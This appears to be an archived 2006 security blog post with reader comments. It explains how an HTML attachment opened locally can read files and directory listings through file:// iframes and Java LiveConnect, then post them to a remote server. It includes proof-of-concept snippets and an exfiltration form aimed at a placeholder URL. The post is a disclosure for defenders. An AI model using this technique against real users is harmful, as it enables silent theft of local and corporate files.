@@ -1,0 +1,443 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/web-pages-from-hell/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:23:23 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; Web Pages from Hell</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Web Pages from Hell Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Cross Context Scripting with Sage' href='../cross-context-scripting-with-sage/index.html' />
+<link rel='next' title='Google Search API Worms' href='../google-search-api-worms/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../index3f3a.html?p=70' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-70" class="post">
+	<div class="post-title"><h2><span>Web Pages from Hell</span></h2></div>
+	<div class="post-date"><span>published:</span> September 11th, 2006</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>You open a html file but you are not aware. You check the content but you don&#8217;t know.</p>
+
+<blockquote>I have just received the report for the third quoter of 2006 by email. My boss says that from now on we will use simple html pages because it is more accessible. Well, I don&#8217;t know much about accessibility and I don&#8217;t really care. I click on the attachment. The html document stores itself no the desktop. Double click and I have it open in Firefox.</blockquote>
+
+<p>What happens next is without any doubt a security breach. Anonymous attacker has just compromised and stole important corporate documents.</p>
+
+<p>Unfortunately, this story is far from being far-fetched. This is something that can happen to your organization and the technology required is here today and ready for use. Concerning, isn&#8217;t it? That&#8217;s the reason why I went a bit deeper into this topic, figuring out various attack vectors and composing a simple toolkit to mitigate the risk. The following post reveals some of my findings and provides disjointed source code as a proof of concept.</p>
+
+<p>In this example we need Java, a single iframe, a form and a remote storage point. The iframe is used as data retrieval mechanism for html, xml and text files. Java is used as data retrieval mechanism for binary files. The form is used to send the data back to a remote storage point in a form of multiple POST request.</p>
+
+<p>The first stage is to compose an iframe. You must be aware that iframes are areas where content can be rendered. This content is retrieved by a URL. The URL describes the location and also the protocol in use, which can be <code>HTTP, HTTPS, FTP, FILE</code> and maybe something else depending of your browser. Obviously <code>FILE</code> sounds quite interesting. This protocol allows us to look and browse through our system or open local files inside our browsers. Just entering <code>file:///C:/</code> in your browser window should open <code>C:\</code> drive.</p>
+
+<p>It is said that iframes are secured in a way that different domains cannot access each other content. This restriction is applied with the same origin model. In simple terms, if a page from <code>a.com</code> creates hidden iframe of <code>b.com</code>, no communication is allowed between them. This means that<code> a.com</code> cannot read what is inside <code>b.com</code> iframe.</p>
+
+<p>In a way this is secure, however the <code>FILE</code> protocol is excluded from this rule simply because file paths don&#8217;t have domains. So, an html file loaded from <code>file:///C:/file.html</code> can open an iframe of <code>file:///D:/file.html</code> and read its content. Of course, it must be noted that no external resource can read files from the local system because the same origin model imply that the protocol must be the same in order to allow communication. This means that HTTP cannot communicate with FILE or FTP.</p>
+
+<p>To cut the story short I will go into an example how all this theory can be used in practice.</p>
+
+<p><em>A file on the file system can open any other file inside an iframe.</em></p>
+
+<pre><code>&lt;iframe src="file:///C:/test.txt"&gt;&lt;/iframe&gt;</code></pre>
+
+<p><em>In order to retrieve the content of this file we have to wait for the iframe to load and then just grab its document body.</em></p>
+
+<pre><code>&lt;iframe src="file:///C:/test.txt" onload="getContent(this)"&gt;&lt;/iframe&gt;
+&lt;script&gt;
+  function getContent(iframe) {
+    var content = '';
+    if (iframe.contentDocument) {
+      content = iframe.contentDocument.body.innerHTML; 
+    } else if (iframe.contentWindow) {
+      content = iframe.contentWindow.document.body.innerHTML;
+    } else if (iframe.document) {
+      content = iframe.document.body.innerHTML;
+    }
+    alert(content);
+  }
+&lt;/script&gt;</code></pre>
+
+<p>The snippet above will display the content of an iframe which currently holds <code>file:///C:/test.txt</code>.</p>
+
+<p>Opening files is not fun although probably you already can see some of the potentials. Let&#8217;s try something more funky by replacing <code>file:///C:/test.txt</code> with <code>file:///C:/.</code> This should open <code>C:\</code> drive.</p>
+
+<pre><code>&lt;iframe src="file:///C:/" onload="getContent(this)"&gt;&lt;/iframe&gt;
+&lt;script&gt;
+  function getContent(iframe) {
+    var content = '';
+    if (iframe.contentDocument) {
+      content = iframe.contentDocument.body.innerHTML; 
+    } else if (iframe.contentWindow) {
+      content = iframe.contentWindow.document.body.innerHTML;
+    } else if (iframe.document) {
+      content = iframe.document.body.innerHTML;
+    }
+    alert(content);
+  }
+&lt;/script&gt;</code></pre>
+
+<p>Potentially, the snippet above has just listed your <code>C:\</code> drive into an alert box. Of course this will work on most browsers but not in IE. IE is secure in this respect, however just keep in mind that IE supports ActiveX which makes the entire process a lot more simpler in some situations.</p>
+
+<p>The next step every attacker probably will do is to create a recursive function which lists directories and upload interesting content on a remote server. If you try to do this you will see that the process is not as trivial as it seams because as soon as your iframe tries to open a binary file, your browser will prompt you with a download box. Of course, the attacker can try to avoid doc, xls and other types of binary files but today this is where all interesting corporate information is stored into.</p>
+
+<p>So, in order to retrieve a binary file another technology needs to be used: Java and more precisely LiveConnect which is supported by Firefox and Opera. Let&#8217;s see how our binary retrieving code looks like:</p>
+
+<pre><code>&lt;script&gt;
+  function liveJaveGetContent(URL) {
+    var result = '';
+    var destination = new java.net.URL(URL);
+    var input = java.io.DataInputStream(destination.openStream());
+
+    while ((line = input.readLine()) != null) {
+      result += line;
+      result += java.lang.System.getProperty('line.separator');
+    }
+
+    input.close();
+    return result;
+  }
+&lt;/script&gt;</code></pre>
+
+<p>I must admit that the code above is not as generic as it can be but&#8230; well, no time.</p>
+
+<p>So, the function above can read binary files and return them in form of a string. This string is quite valuable for the attackers but first it has to be send to a remote location. This can be achieved in many ways, however my favorite one requires something as simple as a html form.</p>
+
+<pre><code>&lt;form name="sendContentForm" method="post" action="http://path/to/remote/location"&gt;
+  &lt;textarea name="content"&gt;&lt;/textarea&gt;
+  &lt;input type="submit"/&gt;
+&lt;/form&gt;</code></pre>
+
+<p>This is it. When we call &#8220;sendContentFrom.submit()&#8221; the data will be transfered from locahost to the remote location. Of course this form wont be able to transport too much content. For that reason we have to do some partitioning and send the data in blocks.I will let this to you to play around.</p>
+
+<p>The conclusion is that you should not trust anything that you open in your browser, unless you completely disable JavaScrpt, Java and Flash. The next time you open a simple html page from your desktop, keep in mind that you may have opened a security hole in your network too. While previewing the document the attacker is able to enumerate the internal infrastructure of your organization by listing mounted shares. These share may contain documents, tables and databases that might be valuable to some individuals and organizations.</p>
+
+<p><em>BTW, just closing the browser window wont stop this attack continuing in the background. Many browsers can be made to stay alive even after you click on the X button. Maybe I will cover this some other time.</em></p><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pdp/index.html" title="Posts by pdp" rel="author">pdp</a></div>
+	</div>
+				
+
+				<div id="post-comments">
+					<div class="comment even thread-even depth-1" id="comment-83">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/897ca8f3cdbe4a0c68be53a8a08c51e0?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.anty.at/' rel='external nofollow' class='url'>anty</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-83">
+			September 17, 2006 at 12:47 am</a>		</div>
+
+		<p>I&#8217;ve just tested this with Firefox and Opera. First: This does only work if you call the HTML file localy right? Second: You don&#8217;t need the iframe. You can list directories with the Java-Function as well.</p>
+<p>It would be cool to get this working if the file is <strong>not</strong> localy called&#8230;</p>
+<p>Thanks for sharing!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-86">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-86">
+			September 17, 2006 at 8:31 am</a>		</div>
+
+		<p>Yes anty,</p>
+<p>You are right. The reason I presented it this way was because sometimes JRE is not installed in which case you cannot read binary files, but you can read text files with iframe. It it the same when listing directories. Also, you can use the XMLHttpRequest object, however, to me it seams that it works on some setups but it doesn&#8217;t on others.</p>
+<p>Yes, this technique works only when the file is executed locally due to the same origin policy. It will not work remotely unless you find a browser bug but this is a completely different story.</p>
+<p>However, there are situations where a plugin or an extension unconsciously caches web content on the file system and presents it to the user. This was the case with <a href="../cross-context-scripting-with-sage/index.html" rel="nofollow" rel="nofollow">Sage cross-context scripting vulnerability</a>.</p>
+<p>The complete sourcode of the techniques presented here are available at <a href="../attackapi/index.html" rel="nofollow" rel="nofollow">AttackAPI project page</a>.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-132">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/8184e348aaa209a916d8b1ed965bac82?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">offtopic</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-132">
+			September 23, 2006 at 11:44 am</a>		</div>
+
+		<p>This techniques widly used to exploit Internet Explorer &#8220;embedded&#8221; in different applications.<br />
+2 old examples</p>
+<p><a href="http://www.securityfocus.com/bid/14385" rel="nofollow">http://www.securityfocus.com/bid/14385</a></p>
+<p><a href="http://www.securityfocus.com/archive/1/433360" rel="nofollow">http://www.securityfocus.com/archive/1/433360</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-135">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/8184e348aaa209a916d8b1ed965bac82?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">offtopic</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-135">
+			September 23, 2006 at 12:40 pm</a>		</div>
+
+		<p>About Internet Explorer. While IE (in XP and W2K3) per se by default locks active content, many applications which reuse IE starts it “unlocked” mode.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-176">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/11566af8dcd11e7aa34805614eab2385?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">ravikiran.k</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-176">
+			October 3, 2006 at 1:49 pm</a>		</div>
+
+		<p>Great Work,Can i get your appointment for a  talk.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-190">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-190">
+			October 5, 2006 at 2:37 am</a>		</div>
+
+		<p>ravikiran.k, sure. You will be able to get my gmail address from various security lists. Add me in and if I am online drop me a message.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-231">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/b729506a9065ad83ca8b9c45a63452c6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">MARCOS OLIVEIRA</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-231">
+			October 10, 2006 at 8:30 pm</a>		</div>
+
+		<p>My problem is that i have IIS and a virtual directory&#8230; could you please tell me if it is possible to use an iframe to get a html page from, for example, c:\test\x.htm&#8230; Be aware that my VD is different from the c:\test.</p>
+<p>Thank you so much.<br />
+Marcos Oliveira</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-233">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-233">
+			October 11, 2006 at 2:50 am</a>		</div>
+
+		<p>MARCOS, maybe I don&#8217;t quite understand your question but from what I see you want to retrieve the content of c:\test\x.htm from <a href="http://www.example.com/" rel="nofollow">http://www.example.com</a> for example. That is not possible.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1849">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/92f59ee8c48437e8ac3405abc5075bb5?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">PartyOf1</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1849">
+			January 4, 2007 at 1:33 pm</a>		</div>
+
+		<p>Do all the attack functions work if IE or FF are runing inside of something like SandBoxIE?</p>
+<p>Does the attack also try to work on a Virtual machine?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-1852">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1852">
+			January 4, 2007 at 2:12 pm</a>		</div>
+
+		<p>the Java live connect will work on FF and Opera only. The rest should work on all browsers</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-23621">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/b10ef17e271f77713b456cac20b95613?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://dsdsdf.freehostia.com/' rel='external nofollow' class='url'>crash_daemonicus</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-23621">
+			May 25, 2007 at 12:51 pm</a>		</div>
+
+		<p>well, unless your target file is a configuration file that would be in correct syntax as a JS file&#8230;. then you simply  and call each configuration variable by name</p>
+<p>but anymore it&#8217;d be difficult unless your target is a specific program&#8217;s configuration file because anymore they have [type of information]  lines that will kill the script</p>
+<p>but if they dont then there might be a problem lol</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-23623">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/b10ef17e271f77713b456cac20b95613?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://dsdsdf.freehostia.com/' rel='external nofollow' class='url'>crash_daemonicus</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-23623">
+			May 25, 2007 at 12:57 pm</a>		</div>
+
+		<p>I guess another classic example of information disclosure would be using res&#58;// calls to DLL&#8217;s to load images only there in certain versions of windows and then testing the image&#8217;s width and height information with javascript&#8230;</p>
+<p>PS. last post my example HTML didnt post:</p>
+<pre><code>&lt;script src=C:\file.ext&gt;</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-23639">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-23639">
+			May 25, 2007 at 3:07 pm</a>		</div>
+
+		<p>crash_daemonicus,</p>
+<p>I totally agree with you, however you can still get certain parts of the file if the information that you are interested in is somewhere at the top of the file. The way you do that is by importing the file as script and watching for errors. Some JS interpreters return not only the type of error that is generated but also the actual code line, which is exactly what you are after.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-59247">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/a4d40d6e6c10342a5701c5d2f02f1887?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">sushant</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-59247">
+			October 17, 2007 at 8:01 pm</a>		</div>
+
+		<p>i am confused.  my question is </p>
+<p>Can i open C drive document on client browser by giving a path in iframe</p>
+<p>example </p>
+<p>can i do this ??</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-81135">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/8f8ff21a67437febebc70afd19364e95?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">tom</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-81135">
+			December 5, 2007 at 12:24 am</a>		</div>
+
+		<p>this web page looks weird like a programmer T-shirt</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-124985">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.pdp.io/' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-124985">
+			January 1, 2009 at 9:01 pm</a>		</div>
+
+		<p>well :) heh&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="70"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="8d128f8418" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/web-pages-from-hell/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:23:23 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
